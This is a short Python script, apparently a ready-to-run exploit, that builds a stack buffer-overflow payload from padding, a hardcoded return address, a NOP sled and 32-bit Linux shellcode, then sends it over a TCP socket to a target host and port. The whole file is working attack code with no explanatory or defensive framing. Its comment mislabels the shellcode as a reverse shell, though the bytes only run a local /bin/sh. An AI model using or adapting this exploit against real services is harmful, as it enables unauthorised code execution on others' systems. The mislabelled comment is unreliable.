#!/usr/bin/python3
import socket
import struct

def create_payload(offset):
    # Shell code for a simple reverse shell (replace with your IP and port)
    shellcode = (
        b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"  # Zero out registers
        b"\x50\x68\x2f\x2f\x73\x68\x68\x2f"  # Push "/bin//sh"
        b"\x62\x69\x6e\x89\xe3\x50\x53\x89"  # Complete pushing string
        b"\xe1\xb0\x0b\xcd\x80"              # execve syscall
    )
    
    # Build the payload
    buffer = b"A" * offset                    # Padding
    eip = struct.pack("<I", 0xbffff7c0)      # Return address (example)
    nops = b"\x90" * 16                      # NOP sled
    
    # Combine all parts
    payload = buffer + eip + nops + shellcode
    
    return payload

def send_exploit(host, port, payload):
    try:
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Send the payload
        print("[+] Sending payload...")
        s.send(payload)
        s.close()
        print("[+] Payload sent successfully")
        
    except Exception as e:
        print("[-] Error:", str(e))

if __name__ == "__main__":
    HOST = "127.0.0.1"  # Target IP
    PORT = 4444         # Target port
    OFFSET = 76         # Buffer overflow offset
    
    payload = create_payload(OFFSET)
    send_exploit(HOST, PORT, payload)
